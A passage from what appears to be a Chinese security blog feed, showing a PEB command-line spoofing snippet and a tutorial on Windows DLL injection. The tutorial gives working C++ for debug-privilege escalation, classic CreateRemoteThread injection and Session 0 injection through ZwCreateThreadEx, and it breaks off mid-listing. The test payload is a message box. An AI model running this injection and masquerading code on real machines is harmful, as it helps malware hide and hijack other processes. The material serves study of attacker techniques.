class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;winternl.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(*MYPROC)</span> <span class="hljs-params">(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE h = <span class="hljs-built_in">GetCurrentProcess</span>();<br>PROCESS_BASIC_INFORMATION ProcessInformation;<br>ULONG len = <span class="hljs-number">0</span>;<br>HINSTANCE ntdll;<br>MYPROC GetProcessInformation;<br><span class="hljs-type">wchar_t</span> commandline[] = <span class="hljs-string">L&quot;C:\\windows\\system32\\notepad.exe&quot;</span>;<br>ntdll = <span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Ntdll.dll&quot;</span>));<br><br><span class="hljs-comment">//解析ntdll.dll中NtQueryInformationProcess的地址</span><br>GetProcessInformation = (MYPROC)<span class="hljs-built_in">GetProcAddress</span>(ntdll, <span class="hljs-string">&quot;NtQueryInformationProcess&quot;</span>);<br><br><span class="hljs-comment">//获取_PEB对象</span><br>(GetProcessInformation)(h, ProcessBasicInformation, &amp;ProcessInformation, <span class="hljs-built_in">sizeof</span>(ProcessInformation), &amp;len);<br><br><span class="hljs-comment">//替换命令行和映像路径名</span><br>ProcessInformation.PebBaseAddress-&gt;ProcessParameters-&gt;CommandLine.Buffer = commandline;<br>ProcessInformation.PebBaseAddress-&gt;ProcessParameters-&gt;ImagePathName.Buffer = commandline;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510051817241.png" alt="image-20251005181736043"></p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510051820720.png" alt="image-20251005182027508"></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20251005185814521.png" alt="image-20251005185814521"></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20251005185833125.png" alt="image-20251005185833125"></p><p>可以清楚的看到，这个对于process hacke这些工具无效，但是对于微软的进程查看工具procexp.exe有效</p><p>当然这也只是ring3层的伪装，在ETW上依然能看见。</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注入的技艺</title>
    <link href="/2025/10/02/%E6%B3%A8%E5%85%A5%E7%9A%84%E6%8A%80%E8%89%BA/"/>
    <url>/2025/10/02/%E6%B3%A8%E5%85%A5%E7%9A%84%E6%8A%80%E8%89%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="dll注入的前言"><a href="#dll注入的前言" class="headerlink" title="dll注入的前言"></a>dll注入的前言</h1><h2 id="dll注入的起源"><a href="#dll注入的起源" class="headerlink" title="dll注入的起源"></a>dll注入的起源</h2><p>dll注入又称之为动态链接库注入。DLL 注入这个概念并没有一个明确的“最早提出者”，它更像是在 Windows 操作系统发展过程中，随着对系统内部机制的理解加深，逐渐被发现和利用的一种技术。</p><p>在 Windows NT 时代，一些病毒和恶意软件开发者为了实现持久化、隐藏自身或劫持其他程序的行为，开始探索各种技术，其中就包括了类似 DLL 注入的方法。他们可能没有明确提出“DLL 注入”这个术语，但他们的实践为这项技术的发展奠定了基础。</p><p>随着恶意软件的增多，安全研究人员和逆向工程师开始深入分析这些恶意软件的行为，并发现了 DLL 注入这种常见的攻击手段。他们对这项技术进行了详细的分析和解释，并将其命名为“DLL 注入”。</p><p>随着时间的推移，一些开源工具和框架（例如 Metasploit 等）开始集成 DLL 注入功能，使得这项技术更容易被安全研究人员、渗透测试人员和甚至一些恶意攻击者所使用。</p><h2 id="dll注入的分类"><a href="#dll注入的分类" class="headerlink" title="dll注入的分类"></a>dll注入的分类</h2><p>根据dll注入的代码和原理，分为很多类，包括但不限于，PE dll注入，hook dll注入(全局钩子或消息钩子)，远程dll注入，APC dll注入(以及衍生出来的Early bird注入)，Session 0注入，反射dll注入，注册表修改注入。 当然还有许许多多的我还并没有了解和研究的技术，如果之后有所涉及和学习，我会进一步做一个补充</p><h1 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h1><p>远程线程注入是最流行和最经典的注入方式了，也是最多文档资料介绍的DLL注入技术。</p><h2 id="一些辅助代码"><a href="#一些辅助代码" class="headerlink" title="一些辅助代码"></a>一些辅助代码</h2><h3 id="开启权限"><a href="#开启权限" class="headerlink" title="开启权限"></a>开启权限</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-type">BOOL</span> EnableDebugPrivilege()<br>&#123;<br>    HANDLE hToken;<br>    <span class="hljs-type">BOOL</span> fOk = <span class="hljs-keyword">FALSE</span>;<br>    <span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))<br>    &#123;<br>        TOKEN_PRIVILEGES tp;<br>        tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>        LookupPrivilegeValue(<span class="hljs-keyword">NULL</span>, SE_DEBUG_NAME, &amp;tp.<span class="hljs-keyword">Privileges</span>[<span class="hljs-number">0</span>].Luid);<br>        tp.<span class="hljs-keyword">Privileges</span>[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>        AdjustTokenPrivileges(hToken, <span class="hljs-keyword">FALSE</span>, &amp;tp, sizeof(tp), <span class="hljs-keyword">NULL</span>, <span class="hljs-keyword">NULL</span>);<br>        fOk = (GetLastError() == ERROR_SUCCESS);<br>        CloseHandle(hToken);<br>    &#125;<br>    <span class="hljs-keyword">return</span> fOk;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="根据进程名寻找PID"><a href="#根据进程名寻找PID" class="headerlink" title="根据进程名寻找PID"></a>根据进程名寻找PID</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">DWORD <span class="hljs-title function_">GetProcessPID</span><span class="hljs-params">(<span class="hljs-type">char</span>* lpProcessName)</span> &#123;<br><br>    <span class="hljs-type">DWORD</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的进程ID，初始为0（未找到）</span><br>    PROCESSENTRY32 P32;<span class="hljs-comment">// 结构体，用于存储进程快照信息</span><br><br>    <span class="hljs-comment">//获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br>    <span class="hljs-type">HANDLE</span> <span class="hljs-variable">IpSnashot</span> <span class="hljs-operator">=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (IpSnashot == INVALID_HANDLE_VALUE) &#123;<br>        printf(<span class="hljs-string">&quot;获取进程快照失败，请检查原因。erro:%d&quot;</span>, GetLastError());<br>    &#125;<br>    P32.dwSize = sizeof(PROCESSENTRY32);<br>    Process32First(IpSnashot, &amp;P32);<span class="hljs-comment">// 获取快照中第一个进程信息</span><br><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (!lstrcmp(P32.szExeFile, lpProcessName)) &#123;<span class="hljs-comment">// 比较进程名</span><br><br>            ret = P32.th32ProcessID;<span class="hljs-comment">// 匹配成功，记录PID</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (Process32Next(IpSnashot, &amp;P32)); <span class="hljs-comment">//检索有关系统快照中记录的下一个进程的信息。</span><br>    CloseHandle(IpSnashot);<span class="hljs-comment">//关闭句柄 </span><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="注入的dll"><a href="#注入的dll" class="headerlink" title="注入的dll"></a>注入的dll</h3><p>就是一个简单的弹窗代码。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><br><span class="hljs-type">BOOL</span> APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        MessageBox(<span class="hljs-literal">NULL</span>, L<span class="hljs-string">&quot;yawataa&quot;</span>, L<span class="hljs-string">&quot;yawataa&quot;</span>, MB_OK);<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="注入的大概过程"><a href="#注入的大概过程" class="headerlink" title="注入的大概过程"></a>注入的大概过程</h2><p>实现步骤： </p><p>1.获取进程句柄 </p><p>通过进程名获取PID</p><p>2.计算dll路径长度 </p><p>3.调用 VirtualAllocEx 在进程里面申请内存 </p><p>4.拷贝dll路径到内存空间里面 </p><p>5.获取 kernel32.dll 的地址 </p><p>6.获取 LoadLibrary 的地址 </p><p>7.通过 CreateRemoteThread 创建远程线程加载dll </p><p>8.关闭句柄</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Tlhelp32.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetProcessPID</span><span class="hljs-params">(LPCTSTR lpProcessName)</span> </span>&#123;<br><br>DWORD ret = <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的进程ID，初始为0（未找到）</span><br>PROCESSENTRY32 P32;<span class="hljs-comment">// 结构体，用于存储进程快照信息</span><br><br><span class="hljs-comment">//获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br>HANDLE IpSnashot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (IpSnashot == INVALID_HANDLE_VALUE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取进程快照失败，请检查原因。erro:%d&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>&#125;<br>P<span class="hljs-number">32.</span>dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);<br><span class="hljs-built_in">Process32First</span>(IpSnashot, &amp;P32);<span class="hljs-comment">// 获取快照中第一个进程信息</span><br><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">lstrcmp</span>(P<span class="hljs-number">32.</span>szExeFile, lpProcessName)) &#123;<span class="hljs-comment">// 比较进程名</span><br><br>ret = P<span class="hljs-number">32.</span>th32ProcessID;<span class="hljs-comment">// 匹配成功，记录PID</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(IpSnashot, &amp;P32)); <span class="hljs-comment">//检索有关系统快照中记录的下一个进程的信息。</span><br><span class="hljs-built_in">CloseHandle</span>(IpSnashot);<span class="hljs-comment">//关闭句柄 </span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;进程ID为：%d\n&quot;</span>, ret);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-comment">//1.打开进程，获取进程句柄</span><br>    <br>    <span class="hljs-type">int</span> pid= <span class="hljs-built_in">GetProcessPID</span>(<span class="hljs-string">&quot;Notepad.exe&quot;</span>);<br><br>    HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);<br><br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败，请检查原因。erro:%d&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><span class="hljs-comment">//2.计算dll路径长度</span><br><span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;F:\\c\\yawatadll\\x64\Release\\yawatadll.dll&quot;</span>)<span class="hljs-number">+1</span>;<br>    <br><br><span class="hljs-comment">//3.调用 VirtualAllocEx 在进程里面申请内存 </span><br><br>    LPVOID lpAddress = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, len, MEM_COMMIT, PAGE_READWRITE);<br>    <span class="hljs-keyword">if</span> (lpAddress == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请内存失败，请检查原因。erro:%d&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br><span class="hljs-comment">//4.将dll路径写入进程</span><br>    <span class="hljs-built_in">WriteProcessMemory</span>(hProcess, lpAddress, <span class="hljs-string">&quot;F:\\c\\yawatadll\\x64\\Release\\yawatadll.dll&quot;</span>, len, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">//5.获取 kernel32.dll 的地址</span><br>    HMODULE hKernel32 = <span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (hKernel32 == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取kernel32.dll失败，请检查原因。erro:%d&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br><span class="hljs-comment">//6.获取 LoadLibrary 的地址</span><br>    FARPROC hLoadLibrary = <span class="hljs-built_in">GetProcAddress</span>(hKernel32, <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>    <span class="hljs-keyword">if</span> (hLoadLibrary == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取LoadLibrary失败，请检查原因。erro:%d&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">//7.创建远程线程进行执行</span><br>    HANDLE hThread = <span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)hLoadLibrary, lpAddress, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hThread == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;创建远程线程失败，请检查原因。erro:%d&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入成功！&quot;</span>);<br>    <span class="hljs-built_in">CloseHandle</span>(hThread);<br>    <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510021659447.png" alt="image-20251002165936270"></p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510021705940.png" alt="image-20251002170516861"></p><h1 id="Session-0注入"><a href="#Session-0注入" class="headerlink" title="Session 0注入"></a>Session 0注入</h1><p>这个注入是源于突破会话隔离的远程线程注入</p><h3 id="SESSION-0-隔离"><a href="#SESSION-0-隔离" class="headerlink" title="SESSION 0 隔离"></a>SESSION 0 隔离</h3><p>在Windows XP、Windows Server 2003，以及更老版本的Windows操作系统中，服务和应用程序使用相同的会话（Session）运行，而这个会话是由第一个登录到控制台的用户启动的。该会话就叫做 Session 0，如下图所示，在Windows Vista之前，Session 0不仅包含服务，也包含标准用户应用程序</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022221926.png" alt="image-20251002222124722"></p><p>将服务和用户应用程序一起在Session 0中运行会导致安全风险，因为服务会使用提升后的权限运行，而 </p><p>用户应用程序使用用户特权（大部分都是非管理员用户）运行，这会使得恶意软件以某个服务为攻击目 </p><p>标，通过“劫持”该服务，达到提升自己权限级别的目的</p><p>从Windows Vista开始，只有服务可以托管到Session 0中，用户应用程序和服务之间会被隔离，并需要 </p><p>运行在用户登录到系统时创建的后续会话中。例如第一个登录的用户创建 Session 1，第二个登录的用 </p><p>户创建Session 2，以此类推，如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022222237.png" alt="image-20251002222215114"></p><p>更直观的我们可以在任务管理器中可以看见进程所在的会话层，如下图</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022240269.png" alt="image-20251002224004111"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>由于SESSION 0 隔离机制的存在，使得传统的远程线程注入系统服务进程失败，和传统的CreateRemoteThread函数实现的DLL远线程注入的唯一一个区别就是,我们调用的是更为底层的ZwCreateThreadEx来创建线程</p><p>ZwCreateThreadEx 函数可以突破SESSION 0 隔离，将DLL注入到SESSION 0 隔离的系统服务进程中， </p><p>CreateRemoteThread 注入系统进程会失败的原因是因为调用 ZwCreateThreadEx 创建远程线程时，第 </p><p>七个参数 CreateThreadFlags 为1 </p><p>使用 CreateRemoteThread 注入失败DLL失败的关键在第七个参数 CreateThreadFlags ， 他会导致线 </p><p>程创建完成后一直挂起无法恢复进程运行，导致注入失败 </p><p>ZwCreateThreadEx </p><p>ZwCreateThreadEx 是一个未文档化的API，但是可以通过 GetProcAddress 来获取其地址</p><p>(小tip)</p><p>未文档化的API:微软官方写了，但是不会拿出来给大家用，但是有大神逆向内核，逆出来了这个api的形式</p><p>未导出的API:微软官方写了，但是不会拿出来给大家用，自己偷偷用</p><p>（小tip）</p><p>同时有一个注意的点就是，ZwCreateThreadEx 在64位和32位的定义下是不一样的</p><p> 我们可以这样声明结构体(预编译的形式)，让代码自动选择对应的定义形式</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs elm">#ifdef _WIN64<br>typedef <span class="hljs-type">DWORD</span>(<span class="hljs-type">WINAPI</span>* typedef_ZwCreateThreadEx)(<br><span class="hljs-type">PHANDLE</span> <span class="hljs-type">ThreadHandle</span>,<br><span class="hljs-type">ACCESS_MASK</span> <span class="hljs-type">DesiredAccess</span>,<br><span class="hljs-type">LPVOID</span> <span class="hljs-type">ObjectAttributes</span>,<br><span class="hljs-type">HANDLE</span> <span class="hljs-type">ProcessHandle</span>,<br><span class="hljs-type">LPTHREAD_START_ROUTINE</span> lpStartAddress,<br><span class="hljs-type">LPVOID</span> lpParameter,<br><span class="hljs-type">ULONG</span> <span class="hljs-type">CreateThreadFlags</span>,<br><span class="hljs-type">SIZE_T</span> <span class="hljs-type">ZeroBits</span>,<br><span class="hljs-type">SIZE_T</span> <span class="hljs-type">StackSize</span>,<br><span class="hljs-type">SIZE_T</span> <span class="hljs-type">MaximumStackSize</span>,<br><span class="hljs-type">LPVOID</span> pUnkown);<br><br><br><br>#<span class="hljs-keyword">else</span><br>typedef <span class="hljs-type">DWORD</span>(<span class="hljs-type">WINAPI</span>* typedef_ZwCreateThreadEx)(<br><span class="hljs-type">PHANDLE</span> <span class="hljs-type">ThreadHandle</span>,<br><span class="hljs-type">ACCESS_MASK</span> <span class="hljs-type">DesiredAccess</span>,<br><span class="hljs-type">LPVOID</span> <span class="hljs-type">ObjectAttributes</span>,<br><span class="hljs-type">HANDLE</span> <span class="hljs-type">ProcessHandle</span>,<br><span class="hljs-type">LPTHREAD_START_ROUTINE</span> lpStartAddress,<br><span class="hljs-type">LPVOID</span> lpParameter,<br><span class="hljs-type">BOOL</span> <span class="hljs-type">CreateSuspended</span>,<br><span class="hljs-type">DWORD</span> dwStackSize,<br><span class="hljs-type">DWORD</span> dw1,<br><span class="hljs-type">DWORD</span> dw2,<br><span class="hljs-type">LPVOID</span> pUnkown);<br></code></pre></td></tr></table></figure><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>整个流程还是这样</p><p>1.打开进程，获取句柄</p><p>2.申请内存</p><p>3.写入内存</p><p>4.获取loadliabary</p><p>5.创建线程执行</p><p>6.等待线程结束</p><p>7.关闭句柄</p><p>session0函数的重点必须拿到 SE_PRIVILEGE_ENABLED 权限，所以需要提权</p><p>SE_PRIVILEGE_ENABLED 就是调试权限，我们必须要有这个权限才能对线程进程这些进行操作，默认是不开启的。我们可以在cmd命令行中输入 whoami &#x2F;all 这个命令来看一下</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022243591.png" alt="image-20251002224322517"></p><h3 id="完整的代码"><a href="#完整的代码" class="headerlink" title="完整的代码"></a>完整的代码</h3><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span 